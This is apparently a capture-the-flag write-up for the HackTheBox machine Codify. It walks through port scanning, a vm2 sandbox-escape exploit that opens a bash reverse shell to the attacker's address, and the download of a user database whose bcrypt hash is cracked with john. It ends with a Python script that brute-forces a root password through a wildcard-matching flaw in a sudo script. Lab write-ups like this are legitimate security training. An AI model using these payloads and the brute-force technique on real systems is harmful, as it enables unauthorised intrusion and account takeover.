---
title: HackTheBox - Codify
date: 2023-11-12 10:33:02
tags: [htb, ctf, writeup, codify, nmap, netcat, sqlite3, python, linux]
category: writeups
description: htb writeup for htb codify
---

# Tools

- nmap
- netcat
- sqlite3
- python

<br>

## Getting User

### Nmap

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Codify]
└─$ sudo nmap -sS -oA nmap/initial_scan 10.129.65.42
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 23:31 EST
Nmap scan report for 10.129.65.42
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Codify]
└─$ sudo nmap -sC -sV -p 22,80,3000 -oA nmap/script_scan 10.129.65.42
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 23:32 EST
Nmap scan report for 10.129.65.42
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.04 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<br>

### Foothold
add vhost to /etc/hosts

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ echo "10.129.65.42 codify.htb" | sudo tee -a /etc/hosts   
[sudo] password for kali: 
10.129.65.42 codify.htb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going to the site, it's a nodejs sandbox environment which has an escape vulnerability.
With a bit of searching, I found an exploit which can be used to escape the environment https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac 

Used **nc** to listen to port 1234 and ran the exploit to get a reverse shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Codify]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("bash -c 'exec bash -i &>/dev/tcp/10.10.14.6/1234 <&1'").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

vm.run(code);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I find the user is using pm2 to run the webserver

See running processes

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
svc@codify:~$ pm2 ps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Show information about the process

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
svc@codify:~$ pm2 desc 0
pm2 desc 0
 Describing process with id 0 - name index 
┌───────────────────┬───────────────────────────────────────┐
│ status            │ online                                │
│ name              │ index                                 │
│ namespace         │ default                               │
│ version           │ N/A                                   │
│ restarts          │ 0                                     │
│ uptime            │ 33m                                   │
│ script path       │ /var/www/editor/index.js              │
│ script args       │ N/A                                   │
│ error log path    │ /home/svc/.pm2/logs/index-error-0.log │
│ out log path      │ /home/svc/.pm2/logs/index-out-0.log   │
│ pid path          │ /home/svc/.pm2/pids/index-0.pid       │
│ interpreter       │ node                                  │
│ interpreter args  │ N/A                                   │
│ script id         │ 0                                     │
│ exec cwd          │ /home/svc                             │
│ exec mode         │ cluster_mode                          │
│ node.js version   │ 18.17.1                               │
│ node env          │ N/A                                   │
│ watch & reload    │ ✘                                     │
│ unstable restarts │ 0                                     │
│ created at        │ 2023-09-12T17:19:27.612Z              │
└───────────────────┴───────────────────────────────────────┘
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Found the directory **/var/www/contact**
Directory contains index.js and tickets.db
Inspecting index.js, we see it saves user credentials to the db
Started a python http server to download tickets.db


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
svc@codify:/var/www/contact$ python3 -m http.server 5555
python3 -m http.server 5555
10.10.14.6 - - [12/Nov/2023 05:04:23] "GET /tickets.db HTTP/1.1" 200 -
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Codify/files]
└─$ wget http://codify.htb:5555/tickets.db                                                         
--2023-11-12 00:04:32--  http://codify.htb:5555/tickets.db
Resolving codify.htb (codify.htb)... 10.129.65.42
Connecting to codify.htb (codify.htb)|10.129.65.42|:5555... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/octet-stream]
Saving to: ‘tickets.db’

tickets.db                                         100%[================================================================================================================>]  20.00K  --.-KB/s    in 0.1s    

2023-11-12 00:04:33 (151 KB/s) - ‘tickets.db’ saved [20480/20480]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We get joshua user but the password is encrypted

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Codify/files]
└─$ sqlite3 tickets.db                     
SQLite version 3.43.1 2023-09-11 12:01:27
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We use john to crack the password

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Codify/files]
└─$ john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:00:09 DONE (2023-11-12 00:15) 0.1106g/s 151.3p/s 151.3c/s 151.3C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now we have the following credentials which we can use to login and get the flag

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
joshua
spongebob1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
joshua@codify:~$ ls
user.txt
joshua@codify:~$ cat user.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<br>

## Getting Root

### Information Gathering

sudo -l shows we have permission to run a bash script

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
joshua@codify:/opt/scripts$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<br>

### Privilege Escalation

Reading https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D, I understand that when using **[[**, if the right hand side of the conditional is not wrapped in quotes it will perform pattern matching when followed by *, not literal.
So we can try to brute force the password using python.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We get the password and login to root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
joshua@codify:~$ python3 script.py
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3

joshua@codify:~$ su
Password: 
root@codify:/home/joshua# cd /root
root@codify:~# cat root.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~